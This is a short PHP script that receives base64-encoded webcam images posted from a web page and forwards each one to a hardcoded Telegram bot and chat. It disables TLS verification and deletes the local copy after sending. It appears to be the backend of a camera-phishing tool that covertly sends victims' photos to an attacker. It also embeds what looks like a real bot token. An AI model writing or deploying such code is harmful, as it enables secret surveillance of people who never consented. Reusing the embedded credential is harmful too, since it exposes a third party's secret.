<?php
$botToken = "8740748797:AAEBPa9drKM0cYqoQGqYhtZn3igRi2yOjnY";
$chatId   = "7236038645";

$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

if (!empty($imageData)) {
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $filename = "/tmp/cam{$date}.jpg";
    file_put_contents($filename, $unencodedData);

    // Telegram-এ ছবি পাঠান
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo'   => new CURLFile(realpath($filename))
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);

    @unlink($filename);
}
exit();
?>
